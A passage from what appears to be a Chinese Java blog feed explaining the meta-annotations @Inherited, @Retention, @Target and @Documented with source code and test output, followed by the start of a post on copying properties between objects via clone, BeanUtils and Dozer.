<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Child</span> <span class="token keyword">extends</span> <span class="token class-name">Parent</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">method3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> a<span class="token punctuation">;</span>

<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>注解测试</p>
  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">SecurityException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Child</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">Child</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
        <span class="token comment">//对类进行测试</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"对类进行测试"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">isAnnotationPresent</span><span class="token punctuation">(</span><span class="token class-name">InheritedTest</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">InheritedTest</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">isAnnotationPresent</span><span class="token punctuation">(</span><span class="token class-name">InheritedTest2</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">InheritedTest2</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//对方法1 进行测试（子类覆写父类）</span>
        <span class="token function">testMethod</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"method"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"（子类覆写父类）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//对方法2 进行测试</span>
        <span class="token function">testMethod</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"method2"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"（子类未覆写父类）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//对方法3 进行测试</span>
        <span class="token function">testMethod</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"method3"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"（子类覆写父类）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//对方法4 进行测试</span>
        <span class="token function">testMethod</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"method4"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"（子类未覆写父类）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//对属性测试</span>
        <span class="token function">testField</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"（子类覆写父类）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">testField</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"（子类未覆写父类）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">testMethod</span><span class="token punctuation">(</span><span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">String</span> desc<span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"对方法："</span> <span class="token operator">+</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"，进行测试。"</span> <span class="token operator">+</span> desc<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">isAnnotationPresent</span><span class="token punctuation">(</span><span class="token class-name">InheritedTest</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">InheritedTest</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">isAnnotationPresent</span><span class="token punctuation">(</span><span class="token class-name">InheritedTest2</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">InheritedTest2</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">testField</span><span class="token punctuation">(</span><span class="token class-name">Field</span> field<span class="token punctuation">,</span> <span class="token class-name">String</span> desc<span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"对属性："</span> <span class="token operator">+</span> field<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"，进行测试"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">isAnnotationPresent</span><span class="token punctuation">(</span><span class="token class-name">InheritedTest</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">InheritedTest</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">isAnnotationPresent</span><span class="token punctuation">(</span><span class="token class-name">InheritedTest2</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">InheritedTest2</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>测试结果：</p>
  <pre class="line-numbers language-none"><code class="language-none">
对类进行测试
使用Inherited的注解 class

对方法：method，进行测试。（子类覆写父类）

对方法：method2，进行测试。（子类未覆写父类）
使用Inherited的注解 method2
未使用Inherited的注解 method2

对方法：method3，进行测试。（子类覆写父类）

对方法：method4，进行测试。（子类未覆写父类）
未使用Inherited的注解 method2

对属性：a，进行测试

对属性：b，进行测试
使用Inherited的注解 field
未使用Inherited的注解 field<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h2 id="Retention">@Retention</h2>
<blockquote>
<p><strong>@Retention</strong>用来定义该注解在哪一个级别可用，在<strong>源代码中(SOURCE)</strong>、<strong>类文件中(CLASS)<strong>或者</strong>运行时(RUNTIME)</strong>。</p>
</blockquote>
<h3 id="注解源码-2">注解源码</h3>
<pre class="line-numbers language-none"><code class="language-none">@Documented
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.ANNOTATION_TYPE)
public @interface Retention {
    /**
     * Returns the retention policy.
     * @return the retention policy
     */
    RetentionPolicy value();
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * Annotation retention policy.  The constants of this enumerated type
 * describe the various policies for retaining annotations.  They are used
 * in conjunction with the {@link Retention} meta-annotation type to specify
 * how long annotations are to be retained.
 *
 * @author  Joshua Bloch
 * @since 1.5
 */</span>
<span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">RetentionPolicy</span> <span class="token punctuation">{</span>
    <span class="token comment">/**
     * Annotations are to be discarded by the compiler.
     */</span>
    <span class="token constant">SOURCE</span><span class="token punctuation">,</span>

    <span class="token comment">/**
     * Annotations are to be recorded in the class file by the compiler
     * but need not be retained by the VM at run time.  This is the default
     * behavior.
     */</span>
    <span class="token constant">CLASS</span><span class="token punctuation">,</span>

    <span class="token comment">/**
     * Annotations are to be recorded in the class file by the compiler and
     * retained by the VM at run time, so they may be read reflectively.
     *
     * @see java.lang.reflect.AnnotatedElement
     */</span>
    <span class="token constant">RUNTIME</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="注解的作用">注解的作用</h3>
<p>RetentionPolicy 决定了 Retention 注解应该如何去保留，也可理解为 @Retention 搭配枚举类型 RetentionPolicy 使用。</p>
<p>按生命周期来划分可分为3类：（这3个生命周期分别对应于：Java源文件(.java文件) —&gt; .class文件 —&gt; 内存中的字节码）</p>
<ul>
<li>
<p><code>RetentionPolicy.SOURCE</code>：<code>（.java文件）</code>注解只保留在源文件，当Java文件编译成 .class 文件的时候，被其标注的注解被遗弃；</p>
</li>
<li>
<p><code>RetentionPolicy.CLASS</code>：<code>（.class文件）</code>注解被保留到class文件中，但jvm加载 .class 文件时候，被其标注的注解会被遗弃，这是默认的生命周期；</p>
</li>
<li>
<p><code>RetentionPolicy.RUNTIME</code>：<code>（内存中的字节码）</code> 注解不仅被保留到 .class 文件中，jvm 加载 .class 文件之后，被其标注的注解仍然存在，所以这个时候才可能通过反射机制读取注解的信息，而前两个生命周期中，通过反射机制读取不到注解信息的；</p>
</li>
</ul>
<h3 id="注解生命周期的选择">注解生命周期的选择</h3>
<p>首先要明确生命周期长度 RUNTIME &gt; CLASS &gt; SOURCE，所以后者能作用到的地方前者一定也能作用到，但是反过来，前者能作用到的地方后者就作用不到。</p>
<ul>
<li>
<p>一般如果需要在<code>运行时去动态获取注解信息</code>，那只能用生命周期最长的 <code>RUNTIME</code> 标注了</p>
<p>比如以下源码中我们常用到的注解：<strong>@Transient、@Deprecated、@Documented、@Inherited、@Retention、@Target</strong> … 等等很多。</p>
</li>
<li>
<p>如果要在编译时进行一些预处理操作，就用 CLASS注解；(如下)</p>
  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">lombok</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Documented</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ElementType</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RetentionPolicy</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * If put on a parameter, lombok will insert a null-check at the start of the method / constructor's body, throwing a
 * {@code NullPointerException} with the parameter's name as message. If put on a field, any generated method assigning
 * a value to this field will also produce these null-checks. 
 */</span>
<span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">FIELD</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">PARAMETER</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">LOCAL_VARIABLE</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">TYPE_USE</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">CLASS</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Documented</span>
<span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">NonNull</span> <span class="token punctuation">{</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>如果只是做一些检查性的操作，比如源码中的 <strong>@Override、@SuppressWarnings、@Native、@Generated</strong> 等就是被 <strong>RetentionPolicy.SOURCE</strong> 标注的</p>
</li>
</ul>
<h2 id="Target">@Target</h2>
<blockquote>
<p><strong>@Target</strong>用来定义你的注解将应用于什么地方(例如是一个方法或者一个域)。</p>
</blockquote>
<h3 id="注解源码-3">注解源码</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Documented</span>
<span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">ANNOTATION_TYPE</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Target</span> <span class="token punctuation">{</span>
    <span class="token comment">/**
     * Returns an array of the kinds of elements an annotation type
     * can be applied to.
     * @return an array of the kinds of elements an annotation type
     * can be applied to
     */</span>
    <span class="token class-name">ElementType</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * The constants of this enumerated type provide a simple classification of the
 * syntactic locations where annotations may appear in a Java program. These
 * constants are used in {@link Target java.lang.annotation.Target}
 * meta-annotations to specify where it is legal to write annotations of a
 * given type.
 *
 * &lt;p&gt;The syntactic locations where annotations may appear are split into
 * &lt;em&gt;declaration contexts&lt;/em&gt; , where annotations apply to declarations, and
 * &lt;em&gt;type contexts&lt;/em&gt; , where annotations apply to types used in
 * declarations and expressions.
 *
 * &lt;p&gt;The constants {@link #ANNOTATION_TYPE} , {@link #CONSTRUCTOR} , {@link
 * #FIELD} , {@link #LOCAL_VARIABLE} , {@link #METHOD} , {@link #PACKAGE} ,
 * {@link #PARAMETER} , {@link #TYPE} , and {@link #TYPE_PARAMETER} correspond
 * to the declaration contexts in JLS 9.6.4.1.
 *
 * &lt;p&gt;For example, an annotation whose type is meta-annotated with
 * {@code @Target(ElementType.FIELD)} may only be written as a modifier for a
 * field declaration.
 *
 * &lt;p&gt;The constant {@link #TYPE_USE} corresponds to the 15 type contexts in JLS
 * 4.11, as well as to two declaration contexts: type declarations (including
 * annotation type declarations) and type parameter declarations.
 *
 * &lt;p&gt;For example, an annotation whose type is meta-annotated with
 * {@code @Target(ElementType.TYPE_USE)} may be written on the type of a field
 * (or within the type of the field, if it is a nested, parameterized, or array
 * type), and may also appear as a modifier for, say, a class declaration.
 *
 * &lt;p&gt;The {@code TYPE_USE} constant includes type declarations and type
 * parameter declarations as a convenience for designers of type checkers which
 * give semantics to annotation types. For example, if the annotation type
 * {@code NonNull} is meta-annotated with
 * {@code @Target(ElementType.TYPE_USE)}, then {@code @NonNull}
 * {@code class C {...}} could be treated by a type checker as indicating that
 * all variables of class {@code C} are non-null, while still allowing
 * variables of other classes to be non-null or not non-null based on whether
 * {@code @NonNull} appears at the variable's declaration.
 *
 * @author  Joshua Bloch
 * @since 1.5
 * @jls 9.6.4.1 @Target
 * @jls 4.1 The Kinds of Types and Values
 */</span>
<span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">ElementType</span> <span class="token punctuation">{</span>
    <span class="token comment">/** Class, interface (including annotation type), or enum declaration */</span>
    <span class="token constant">TYPE</span><span class="token punctuation">,</span>

    <span class="token comment">/** Field declaration (includes enum constants) */</span>
    <span class="token constant">FIELD</span><span class="token punctuation">,</span>

    <span class="token comment">/** Method declaration */</span>
    <span class="token constant">METHOD</span><span class="token punctuation">,</span>

    <span class="token comment">/** Formal parameter declaration */</span>
    <span class="token constant">PARAMETER</span><span class="token punctuation">,</span>

    <span class="token comment">/** Constructor declaration */</span>
    <span class="token constant">CONSTRUCTOR</span><span class="token punctuation">,</span>

    <span class="token comment">/** Local variable declaration */</span>
    <span class="token constant">LOCAL_VARIABLE</span><span class="token punctuation">,</span>

    <span class="token comment">/** Annotation type declaration */</span>
    <span class="token constant">ANNOTATION_TYPE</span><span class="token punctuation">,</span>

    <span class="token comment">/** Package declaration */</span>
    <span class="token constant">PACKAGE</span><span class="token punctuation">,</span>

    <span class="token comment">/**
     * Type parameter declaration
     *
     * @since 1.8
     */</span>
    <span class="token constant">TYPE_PARAMETER</span><span class="token punctuation">,</span>

    <span class="token comment">/**
     * Use of a type
     *
     * @since 1.8
     */</span>
    <span class="token constant">TYPE_USE</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Documented">@Documented</h2>
<blockquote>
<p>@Documented：注解表明这个注解应该被 javadoc工具记录。</p>
<p>默认情况下，javadoc是不包括注解的。但如果声明注解时指定了 @Documented，则它会被 javadoc 之类的工具处理，所以注解类型信息也会被包括在生成的文档中。是一个标记注解，没有成员。</p>
</blockquote>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>注解</tag>
      </tags>
  </entry>
  <entry>
    <title>对象之间相同属性的赋值</title>
    <url>/20221027/79cf73a2.html</url>
    <content><![CDATA[<p>参考：<a href="https://blog.csdn.net/power0405hf/article/details/78521286">Java 对象之间相同属性的赋值</a></p>
<h1>Java中clone()与new的区别</h1>
<p>区别</p>
<p>（1）在java中clone()与new都能创建对象。<br>
（2）clone()不会调用构造方法；new会调用构造方法。<br>
（3）clone()能快速创建一个已有对象的副本，即创建对象并且将已有对象中所有属性值克隆；</p>
<p>new只能在JVM中申请一个空的内存区域，对象的属性值要通过构造方法赋值。</p>
<p>注意：<br>
（1）使用clone()类必须实现<strong>java.lang.Cloneable</strong>接口并<strong>重写Object类的clone()方法</strong>，如果没有实现Cloneable()接口将会抛出CloneNotSupportedException异常。（此类实现java.lang.Cloneable接口，指示Object.clone()方法可以合法的对该类实例进行按字段复制。）<br>
（2）默认的Object.clone()方法是浅拷贝，创建好对象的副本然后通过“赋值”拷贝内容，如果类包含引用类型变量，那么原始对象和克隆对象的引用将指向相同的引用内容。</p>
<p>面试题：什么是浅拷贝？什么是深拷贝？</p>
<ul>
<li>“浅拷贝”：默认的Object.clone()方法,对于引用类型成员变量拷贝只是拷贝“值”即地址，没有在堆中开辟新的内存空间。</li>
<li>“深拷贝”：重写clone()方法，对于引用类型成员变量，重新在堆中开辟新的内存空间。</li>
</ul>
<h1>BeanUtils.copyProperties：可以进行类型转换</h1>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span><span class="token class-name">BeanUtils</span></span><span class="token punctuation">;</span>
<span class="token class-name">User</span> src <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token class-name">User</span> dest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token class-name">BeanUtils</span><span class="token punctuation">.</span><span class="token function">copyProperties</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h1>PropertyUtils.copyProperties：不会进行类型转换</h1>
<h1>使用Dozer</h1>
<p>在pom.xml中增加依赖</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>net.sf.dozer<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>dozer<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>5.5.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Spring集成dozer</p>
